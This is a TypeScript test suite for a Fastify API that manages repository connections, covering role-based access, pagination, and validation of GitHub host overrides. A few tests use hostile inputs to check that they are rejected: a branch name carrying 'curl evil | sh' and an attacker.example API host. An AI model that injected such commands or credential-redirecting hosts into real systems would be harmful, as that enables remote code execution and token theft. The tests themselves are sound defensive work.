// Import the real schema from the subpath so it is not intercepted by the
// barrel mock below (the subpath has no PrismaClient dependency).
import { ConnectionTypeSchema } from '@auto-swe/shared/lib/connectionTypes';
import Fastify from 'fastify';
import { serializerCompiler, validatorCompiler } from 'fastify-type-provider-zod';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

// repositories.ts only uses `Prisma.DbNull` and connection token helpers at
// runtime; mocking the barrel avoids instantiating the real PrismaClient
// singleton (which requires DATABASE_URL at import) — same pattern as
// humanSteps.test.ts / slack.test.ts.
const DB_NULL = vi.hoisted(() => ({ __sentinel: 'Prisma.DbNull' }));
vi.mock('@auto-swe/shared', () => ({
  ConnectionTypeSchema,
  encryptConnectionApiToken: (token: string) => ({
    apiKeyAuthTag: Buffer.from('auth-tag'),
    apiKeyCiphertext: Buffer.from(`cipher-${token}`),
    apiKeyNonce: Buffer.from('nonce'),
    apiKeyVersion: 1,
  }),
  Prisma: { DbNull: DB_NULL },
  Role: { ADMIN: 'ADMIN', ENGINEER: 'ENGINEER', LEAD: 'LEAD' },
}));

// The configured GitHub instance — a GitHub Enterprise host, so public GitHub
// and the configured instance are distinguishable in the host-override tests.
const ghConfig = vi.hoisted(() => ({
  apiUrl: 'https://ghe.corp.example/api/v3',
  baseUrl: 'https://ghe.corp.example',
}));
vi.mock('@auto-swe/shared/lib/systemConfig', () => ({
  resolveGitHubConfig: vi.fn(async () => ghConfig),
}));

import { repositoryRoutes } from './repositories.js';

interface AuthState {
  role: 'ADMIN' | 'LEAD' | 'ENGINEER';
  sub: string;
}

async function buildApp() {
  const app = Fastify();
  app.setValidatorCompiler(validatorCompiler);
  app.setSerializerCompiler(serializerCompiler);

  const authState: AuthState = { role: 'ADMIN', sub: 'admin-1' };

  const mockPrisma = {
    connection: {
      count: vi.fn(),
      create: vi.fn(),
      findFirst: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
    },
    team: {
      findUnique: vi.fn(),
    },
    teamMembership: {
      findUnique: vi.fn(),
    },
  };

  const mockAuth = {
    verifyAccessToken: () => ({
      exp: 9999999999,
      iat: 0,
      role: authState.role,
      sub: authState.sub,
    }),
  };

  app.decorate('prisma', mockPrisma as unknown as never);
  app.decorate('auth', mockAuth as unknown as never);

  await app.register(repositoryRoutes, { prefix: '/api/v1/repositories' });
  await app.ready();

  return { app, authState, mockPrisma };
}

const AUTH_HEADER = { authorization: 'Bearer fake-jwt' };
const TEAM_ID = '22222222-2222-4222-8222-222222222222';
const REPO_ID = '33333333-3333-4333-8333-333333333333';

function p2002(target: string[]) {
  return Object.assign(new Error('Unique constraint failed'), {
    code: 'P2002',
    meta: { target },
  });
}

describe('repositoryRoutes', () => {
  let ctx: Awaited<ReturnType<typeof buildApp>>;

  beforeAll(async () => {
    ctx = await buildApp();
  });
  afterAll(() => ctx.app.close());
  beforeEach(() => {
    ctx.authState.role = 'ADMIN';
    ctx.authState.sub = 'admin-1';
    ctx.mockPrisma.connection.count.mockReset();
    ctx.mockPrisma.connection.create.mockReset();
    ctx.mockPrisma.connection.findFirst.mockReset();
    ctx.mockPrisma.connection.findMany.mockReset();
    ctx.mockPrisma.connection.findUnique.mockReset();
    ctx.mockPrisma.connection.update.mockReset();
    ctx.mockPrisma.team.findUnique.mockReset();
    ctx.mockPrisma.teamMembership.findUnique.mockReset();
  });

  describe('GET /api/v1/repositories', () => {
    it('returns a paginated list with meta.total/limit/offset', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
        { id: 'repo-1', repoName: 'alpha', teamId: TEAM_ID },
        { id: 'repo-2', repoName: 'beta', teamId: TEAM_ID },
      ]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(2);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.payload);
      expect(body.data).toHaveLength(2);
      // Defaults from paginationQuery({ defaultLimit: 200, maxLimit: 500 }).
      expect(body.meta).toEqual({ limit: 200, offset: 0, total: 2 });
    });

    it('honors explicit limit/offset query params', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(50);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=10&offset=20',
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).meta).toEqual({ limit: 10, offset: 20, total: 50 });
      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs).toMatchObject({ skip: 20, take: 10 });
    });

    it('does not scope the where clause to a team for an ADMIN', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({ isActive: true });
      const countArgs = ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0];
      expect(countArgs.where).toEqual({ isActive: true });
    });

    it('scopes the where clause to the caller’s teams for a non-ADMIN', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({
        isActive: true,
        team: { memberships: { some: { userId: 'engineer-7' } } },
      });
    });

    it('includes deactivated connections for a LEAD+ caller that asks for them', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({});
    });

    it('shows a platform LEAD deactivated connections only on teams they lead', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-3';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({
        // Active rows on any of their teams; inactive rows only where they are
        // team LEAD/ADMIN and so could reactivate them.
        AND: [
          {
            OR: [
              { isActive: true },
              {
                team: {
                  memberships: { some: { role: { in: ['LEAD', 'ADMIN'] }, userId: 'lead-3' } },
                },
              },
            ],
          },
        ],
        team: { memberships: { some: { userId: 'lead-3' } } },
      });
      expect(ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0].where).toEqual(
        findManyArgs.where
      );
    });

    it('ignores includeInactive for an ENGINEER, and treats "false" as false', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValue([]);
      ctx.mockPrisma.connection.count.mockResolvedValue(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where).toMatchObject({
        isActive: true,
      });

      ctx.authState.role = 'ADMIN';
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=false',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where).toEqual({
        isActive: true,
      });
    });

    it('returns 400 when limit exceeds maxLimit', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=501',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.findMany).not.toHaveBeenCalled();
    });

    it('returns 400 for a negative offset', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?offset=-1',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'GET',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });
  });

  describe('POST /api/v1/repositories', () => {
    it('rejects a defaultBranch that is not a valid git ref name (400)', async () => {
      const res = await ctx.app.inject({
        body: {
          defaultBranch: 'main; curl evil | sh',
          organizationName: 'acme',
          repoName: 'api',
          teamId: TEAM_ID,
        },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('refuses to create an MCP connection through the repository path (400)', async () => {
      const res = await ctx.app.inject({
        body: { config: { url: 'http://mcp.internal' }, teamId: TEAM_ID, type: 'mcp' },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
    const validBody = {
      organizationName: 'acme',
      repoName: 'widgets',
      teamId: TEAM_ID,
      type: 'git_repo',
    };

    it('onboards a repository and returns 201', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({
        id: REPO_ID,
        organizationName: 'acme',
        repoName: 'widgets',
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
      expect(JSON.parse(res.payload).data.id).toBe(REPO_ID);
    });

    it('returns 409 REPO_EXISTS on the friendly pre-check duplicate (no create call)', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce({ id: 'existing-repo' });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('returns 409 REPO_EXISTS (not 500) when create races past the pre-check into a P2002', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockRejectedValueOnce(
        p2002(['organizationName', 'repoName'])
      );

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
    });

    it('returns 400 VALIDATION_ERROR when a git_repo is missing organizationName/repoName', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { teamId: TEAM_ID, type: 'git_repo' },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(400);
      expect(JSON.parse(res.payload).error.code).toBe('VALIDATION_ERROR');
      expect(ctx.mockPrisma.team.findUnique).not.toHaveBeenCalled();
    });

    it('returns 404 TEAM_NOT_FOUND when the team is missing or inactive', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('TEAM_NOT_FOUND');
    });

    it('returns 403 for a platform LEAD who does not lead the target team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null); // no membership in this team

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('allows a LEAD who does lead the target team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce({
        role: 'LEAD',
        team: { isActive: true },
      });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
    });

    it('returns 400 for a missing teamId', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { organizationName: 'acme', repoName: 'widgets', type: 'git_repo' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 400 for an invalid githubUrl', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { ...validBody, githubUrl: 'not-a-url' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 403 for a non-LEAD (ENGINEER) caller', async () => {
      ctx.authState.role = 'ENGINEER';

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.team.findUnique).not.toHaveBeenCalled();
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });
  });

  describe('PATCH /api/v1/repositories/:id', () => {
    it('updates the repository and returns the new row', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.connection.update.mockResolvedValueOnce({
        description: 'updated',
        id: REPO_ID,
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data.description).toBe('updated');
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('returns 404 when the repository does not exist', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_NOT_FOUND');
    });

    it('returns 403 for a non-ADMIN who does not lead the repository’s current team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'nope' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
    });

    it('returns 400 for a malformed :id param', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'x' },
        url: '/api/v1/repositories/not-a-uuid',
      });
      expect(res.statusCode).toBe(400);
    });
  });
});

describe('repository GitHub host overrides (credential destinations)', () => {
  let ctx: Awaited<ReturnType<typeof buildApp>>;
  const body = { organizationName: 'acme', repoName: 'widgets', teamId: TEAM_ID, type: 'git_repo' };

  beforeAll(async () => {
    ctx = await buildApp();
  });
  afterAll(() => ctx.app.close());
  beforeEach(() => {
    ctx.authState.role = 'ADMIN';
    ctx.authState.sub = 'admin-1';
    for (const fn of Object.values(ctx.mockPrisma.connection)) {
      fn.mockReset();
    }
    ctx.mockPrisma.team.findUnique.mockReset().mockResolvedValue({ id: TEAM_ID, isActive: true });
    ctx.mockPrisma.teamMembership.findUnique
      .mockReset()
      .mockResolvedValue({ role: 'LEAD', team: { isActive: true } });
    ctx.mockPrisma.connection.findFirst.mockResolvedValue(null);
    ctx.mockPrisma.connection.create.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
  });

  const post = (payload: Record<string, unknown>) =>
    ctx.app.inject({
      headers: AUTH_HEADER,
      method: 'POST',
      payload: { ...body, ...payload },
      url: '/api/v1/repositories',
    });
  const patch = (payload: Record<string, unknown>) =>
    ctx.app.inject({
      headers: AUTH_HEADER,
      method: 'PATCH',
      payload,
      url: `/api/v1/repositories/${REPO_ID}`,
    });

  it('an ADMIN may set a configured-instance override; it is stored normalised', async () => {
    const res = await post({
      githubApiUrl: 'https://GHE.corp.example/api/v3/',
      githubUrl: 'https://ghe.corp.example/',
    });
    expect(res.statusCode).toBe(201);
    expect(ctx.mockPrisma.connection.create.mock.calls[0]?.[0].data).toMatchObject({
      githubApiUrl: 'https://ghe.corp.example/api/v3',
      githubUrl: 'https://ghe.corp.example',
    });
  });

  it('rejects a host nobody configured, even from an ADMIN', async () => {
    const res = await post({ githubApiUrl: 'https://attacker.example/api/v3' });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('INVALID_GITHUB_HOST');
    expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
  });

  it('rejects a per-repository URL in a host column', async () => {
    const res = await post({ githubUrl: 'https://ghe.corp.example/acme/widgets' });
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('INVALID_GITHUB_HOST');
  });

  it('a team LEAD may not point a repository at a different (even trusted) host', async () => {
    ctx.authState.role = 'LEAD';
    ctx.authState.sub = 'lead-1';
    const res = await post({ githubApiUrl: 'https://api.github.com' });
    expect(res.statusCode).toBe(403);
    expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
  });

  it('a team LEAD may import onto the configured instance (no credential moves)', async () => {
    ctx.authState.role = 'LEAD';
    ctx.authState.sub = 'lead-1';
    const res = await post({
      githubApiUrl: 'https://ghe.corp.example/api/v3',
      githubUrl: 'https://ghe.corp.example',
    });
    expect(res.statusCode).toBe(201);
  });

  it('a team LEAD may re-send an unchanged override or clear it on PATCH, but not change it', async () => {
    ctx.authState.role = 'LEAD';
    ctx.authState.sub = 'lead-1';
    const current = {
      githubApiUrl: 'https://api.github.com',
      githubUrl: 'https://github.com',
      id: REPO_ID,
      teamId: TEAM_ID,
      type: 'git_repo',
    };
    ctx.mockPrisma.connection.findUnique.mockResolvedValue(current);

    expect(
      (await patch({ description: 'x', githubApiUrl: 'https://api.github.com/' })).statusCode
    ).toBe(200);
    expect((await patch({ githubApiUrl: null })).statusCode).toBe(200);

    ctx.mockPrisma.connection.update.mockClear();
    const res = await patch({ githubUrl: 'https://ghe.corp.example/api/v3' });
    expect(res.statusCode).toBe(400);
    const res2 = await patch({
      githubApiUrl: 'https://ghe.corp.example/api/v3',
      githubUrl: 'https://github.com',
    });
    expect(res2.statusCode).toBe(200);
    // …but a different trusted host that is neither current nor configured is ADMIN-only.
    current.githubApiUrl = 'https://ghe.corp.example/api/v3';
    const res3 = await patch({ githubApiUrl: 'https://api.github.com' });
    expect(res3.statusCode).toBe(403);
  });
});
